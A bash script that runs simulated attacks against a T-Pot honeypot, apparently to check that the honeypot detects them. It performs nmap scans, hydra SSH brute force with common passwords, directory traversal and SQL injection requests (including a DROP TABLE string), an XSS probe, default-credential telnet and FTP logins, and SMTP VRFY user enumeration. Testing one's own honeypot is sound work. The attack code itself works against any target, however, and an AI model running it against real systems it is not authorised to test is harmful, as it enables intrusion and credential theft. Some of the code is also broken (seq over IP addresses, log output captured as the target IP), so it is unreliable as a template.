#!/bin/bash

# T-Pot Honeypot Attack Simulation Script
# Simulates various attacks to test honeypot functionality
# Author: Security Infrastructure Team
# Version: 1.0

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
CONFIG_FILE="config/environment.conf"
ATTACK_LOG="/tmp/attack-simulation-$(date +%Y%m%d-%H%M%S).log"

# Load configuration
if [[ -f "$CONFIG_FILE" ]]; then
    source "$CONFIG_FILE"
else
    echo -e "${RED}[ERROR]${NC} Configuration file not found: $CONFIG_FILE"
    exit 1
fi

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$ATTACK_LOG"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$ATTACK_LOG"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$ATTACK_LOG"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$ATTACK_LOG"
}

check_tools() {
    log_info "Checking required tools..."
    
    local tools=("nmap" "curl" "nc" "hydra")
    local missing_tools=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_warning "Missing tools: ${missing_tools[*]}"
        log_info "Installing missing tools..."
        
        # Try to install missing tools
        if command -v apt &> /dev/null; then
            sudo apt update
            for tool in "${missing_tools[@]}"; do
                case "$tool" in
                    "hydra") sudo apt install -y hydra ;;
                    "nmap") sudo apt install -y nmap ;;
                    "nc") sudo apt install -y netcat-openbsd ;;
                    "curl") sudo apt install -y curl ;;
                esac
            done
        else
            log_error "Cannot install tools automatically. Please install: ${missing_tools[*]}"
            exit 1
        fi
    fi
    
    log_success "All required tools are available"
}

get_target_ip() {
    # Try to determine the target IP (OPNsense WAN interface)
    local target_ip=""
    
    if [[ "$OPNSENSE_WAN_TYPE" == "static" && -n "$OPNSENSE_WAN_IP" ]]; then
        target_ip="$OPNSENSE_WAN_IP"
    else
        # Try to find OPNsense WAN IP in common ranges
        for ip in $(seq 192.168.1.200 192.168.1.210); do
            if timeout 3 ping -c 1 "$ip" &> /dev/null; then
                target_ip="$ip"
                break
            fi
        done
    fi
    
    if [[ -z "$target_ip" ]]; then
        log_error "Cannot determine target IP address"
        log_info "Please specify target IP manually:"
        read -p "Enter OPNsense WAN IP: " target_ip
    fi
    
    echo "$target_ip"
}

simulate_port_scan() {
    local target_ip="$1"
    log_info "Simulating port scan attack on $target_ip..."
    
    # Basic TCP SYN scan
    log_info "Running TCP SYN scan..."
    nmap -sS -O -p 1-1000 "$target_ip" 2>&1 | tee -a "$ATTACK_LOG"
    
    # UDP scan on common ports
    log_info "Running UDP scan on common ports..."
    nmap -sU -p 53,67,68,123,161,162 "$target_ip" 2>&1 | tee -a "$ATTACK_LOG"
    
    # Service version detection
    log_info "Running service version detection..."
    nmap -sV -p 22,80,443 "$target_ip" 2>&1 | tee -a "$ATTACK_LOG"
    
    log_success "Port scan simulation completed"
}

simulate_ssh_bruteforce() {
    local target_ip="$1"
    log_info "Simulating SSH brute force attack on $target_ip:22..."
    
    # Create a small wordlist for testing
    local wordlist="/tmp/test_passwords.txt"
    cat > "$wordlist" << EOF
admin
password
123456
root
toor
test
guest
user
EOF
    
    # Run hydra with limited attempts
    log_info "Running SSH brute force with common passwords..."
    timeout 60 hydra -l admin -P "$wordlist" -t 4 -f "$target_ip" ssh 2>&1 | tee -a "$ATTACK_LOG" || true
    timeout 60 hydra -l root -P "$wordlist" -t 4 -f "$target_ip" ssh 2>&1 | tee -a "$ATTACK_LOG" || true
    
    # Clean up
    rm -f "$wordlist"
    
    log_success "SSH brute force simulation completed"
}

simulate_web_attacks() {
    local target_ip="$1"
    log_info "Simulating web attacks on $target_ip..."
    
    # Test HTTP
    if timeout 10 nc -zv "$target_ip" 80 &> /dev/null; then
        log_info "Testing HTTP service..."
        
        # Basic HTTP requests
        curl -s -I "http://$target_ip/" 2>&1 | tee -a "$ATTACK_LOG" || true
        curl -s "http://$target_ip/" 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # Directory traversal attempts
        log_info "Testing directory traversal..."
        curl -s "http://$target_ip/../../../etc/passwd" 2>&1 | tee -a "$ATTACK_LOG" || true
        curl -s "http://$target_ip/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # SQL injection attempts
        log_info "Testing SQL injection..."
        curl -s "http://$target_ip/login.php?user=admin'OR'1'='1" 2>&1 | tee -a "$ATTACK_LOG" || true
        curl -s "http://$target_ip/search?q='; DROP TABLE users; --" 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # XSS attempts
        log_info "Testing XSS..."
        curl -s "http://$target_ip/search?q=<script>alert('xss')</script>" 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # Common file requests
        log_info "Testing common file access..."
        local files=("robots.txt" "sitemap.xml" "admin" "login" "wp-admin" "phpmyadmin")
        for file in "${files[@]}"; do
            curl -s -I "http://$target_ip/$file" 2>&1 | tee -a "$ATTACK_LOG" || true
        done
    fi
    
    # Test HTTPS
    if timeout 10 nc -zv "$target_ip" 443 &> /dev/null; then
        log_info "Testing HTTPS service..."
        curl -k -s -I "https://$target_ip/" 2>&1 | tee -a "$ATTACK_LOG" || true
        curl -k -s "https://$target_ip/" 2>&1 | tee -a "$ATTACK_LOG" || true
    fi
    
    log_success "Web attack simulation completed"
}

simulate_telnet_attacks() {
    local target_ip="$1"
    log_info "Simulating Telnet attacks on $target_ip:23..."
    
    # Check if Telnet is available
    if timeout 5 nc -zv "$target_ip" 23 &> /dev/null; then
        log_info "Telnet service detected, attempting login..."
        
        # Try common credentials
        local credentials=("admin:admin" "root:root" "admin:password" "admin:" "root:")
        
        for cred in "${credentials[@]}"; do
            local user="${cred%:*}"
            local pass="${cred#*:}"
            
            log_info "Trying $user:$pass"
            (
                sleep 1
                echo "$user"
                sleep 1
                echo "$pass"
                sleep 1
                echo "exit"
            ) | timeout 10 nc "$target_ip" 23 2>&1 | tee -a "$ATTACK_LOG" || true
        done
    else
        log_info "Telnet service not available on port 23"
    fi
    
    log_success "Telnet attack simulation completed"
}

simulate_ftp_attacks() {
    local target_ip="$1"
    log_info "Simulating FTP attacks on $target_ip:21..."
    
    # Check if FTP is available
    if timeout 5 nc -zv "$target_ip" 21 &> /dev/null; then
        log_info "FTP service detected, attempting anonymous login..."
        
        # Try anonymous FTP
        (
            sleep 1
            echo "USER anonymous"
            sleep 1
            echo "PASS anonymous@example.com"
            sleep 1
            echo "LIST"
            sleep 1
            echo "QUIT"
        ) | timeout 15 nc "$target_ip" 21 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # Try common credentials
        local credentials=("admin:admin" "ftp:ftp" "test:test")
        
        for cred in "${credentials[@]}"; do
            local user="${cred%:*}"
            local pass="${cred#*:}"
            
            log_info "Trying FTP $user:$pass"
            (
                sleep 1
                echo "USER $user"
                sleep 1
                echo "PASS $pass"
                sleep 1
                echo "QUIT"
            ) | timeout 10 nc "$target_ip" 21 2>&1 | tee -a "$ATTACK_LOG" || true
        done
    else
        log_info "FTP service not available on port 21"
    fi
    
    log_success "FTP attack simulation completed"
}

simulate_smtp_attacks() {
    local target_ip="$1"
    log_info "Simulating SMTP attacks on $target_ip:25..."
    
    # Check if SMTP is available
    if timeout 5 nc -zv "$target_ip" 25 &> /dev/null; then
        log_info "SMTP service detected, testing commands..."
        
        # Basic SMTP commands
        (
            sleep 1
            echo "HELO attacker.com"
            sleep 1
            echo "MAIL FROM: <attacker@evil.com>"
            sleep 1
            echo "RCPT TO: <victim@target.com>"
            sleep 1
            echo "DATA"
            sleep 1
            echo "Subject: Test Email"
            echo ""
            echo "This is a test email from honeypot simulation."
            echo "."
            sleep 1
            echo "QUIT"
        ) | timeout 15 nc "$target_ip" 25 2>&1 | tee -a "$ATTACK_LOG" || true
        
        # VRFY command (user enumeration)
        local users=("admin" "root" "test" "user" "postmaster")
        for user in "${users[@]}"; do
            log_info "Testing VRFY $user"
            (
                sleep 1
                echo "VRFY $user"
                sleep 1
                echo "QUIT"
            ) | timeout 5 nc "$target_ip" 25 2>&1 | tee -a "$ATTACK_LOG" || true
        done
    else
        log_info "SMTP service not available on port 25"
    fi
    
    log_success "SMTP attack simulation completed"
}

check_tpot_logs() {
    log_info "Checking T-Pot logs for attack detection..."
    
    # Wait a moment for logs to be processed
    sleep 10
    
    # Try to access T-Pot web interface to verify logging
    if curl -k -s --connect-timeout 10 "https://$TPOT_IP:64297" &> /dev/null; then
        log_success "T-Pot web interface is accessible"
        log_info "Please check the T-Pot dashboard at https://$TPOT_IP:64297"
        log_info "Look for attack logs in:"
        log_info "- Attack Map (real-time attacks)"
        log_info "- Kibana Dashboard (detailed logs)"
        log_info "- Individual honeypot logs"
    else
        log_warning "Cannot access T-Pot web interface directly"
        log_info "Check T-Pot logs manually on the honeypot system"
    fi
}

generate_attack_report() {
    log_info "Generating attack simulation report..."
    
    echo "======================================" >> "$ATTACK_LOG"
    echo "T-POT ATTACK SIMULATION REPORT" >> "$ATTACK_LOG"
    echo "======================================" >> "$ATTACK_LOG"
    echo "Date: $(date)" >> "$ATTACK_LOG"
    echo "Target: $1" >> "$ATTACK_LOG"
    echo "" >> "$ATTACK_LOG"
    
    echo "Attacks Simulated:" >> "$ATTACK_LOG"
    echo "- Port Scanning (TCP/UDP)" >> "$ATTACK_LOG"
    echo "- SSH Brute Force" >> "$ATTACK_LOG"
    echo "- Web Application Attacks" >> "$ATTACK_LOG"
    echo "- Telnet Login Attempts" >> "$ATTACK_LOG"
    echo "- FTP Login Attempts" >> "$ATTACK_LOG"
    echo "- SMTP Enumeration" >> "$ATTACK_LOG"
    echo "" >> "$ATTACK_LOG"
    
    echo "Next Steps:" >> "$ATTACK_LOG"
    echo "1. Check T-Pot dashboard: https://$TPOT_IP:64297" >> "$ATTACK_LOG"
    echo "2. Review attack logs in Kibana" >> "$ATTACK_LOG"
    echo "3. Verify honeypot services are logging attacks" >> "$ATTACK_LOG"
    echo "4. Check OPNsense firewall logs" >> "$ATTACK_LOG"
    echo "" >> "$ATTACK_LOG"
    echo "Full attack log: $ATTACK_LOG" >> "$ATTACK_LOG"
    
    log_success "Attack simulation completed successfully!"
    echo
    echo "======================================="
    echo "ATTACK SIMULATION SUMMARY"
    echo "======================================="
    echo "Target: $1"
    echo "Log file: $ATTACK_LOG"
    echo
    echo "✅ Attack simulation completed"
    echo "🔍 Check T-Pot dashboard for detected attacks"
    echo "📊 Review logs in Kibana for detailed analysis"
    echo
}

main() {
    echo "========================================"
    echo "T-Pot Honeypot Attack Simulation"
    echo "========================================"
    echo
    
    # Initialize attack log
    echo "T-Pot Attack Simulation - $(date)" > "$ATTACK_LOG"
    echo "========================================" >> "$ATTACK_LOG"
    
    # Check prerequisites
    check_tools
    
    # Get target IP
    local target_ip
    target_ip=$(get_target_ip)
    log_info "Target IP: $target_ip"
    
    # Warning
    echo
    log_warning "This script will simulate attacks against your honeypot"
    log_warning "Ensure you have permission to test this system"
    echo
    read -p "Continue with attack simulation? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        log_info "Attack simulation cancelled"
        exit 0
    fi
    
    # Run attack simulations
    simulate_port_scan "$target_ip"
    simulate_ssh_bruteforce "$target_ip"
    simulate_web_attacks "$target_ip"
    simulate_telnet_attacks "$target_ip"
    simulate_ftp_attacks "$target_ip"
    simulate_smtp_attacks "$target_ip"
    
    # Check results
    check_tpot_logs
    
    # Generate report
    generate_attack_report "$target_ip"
}

# Run main function
main "$@"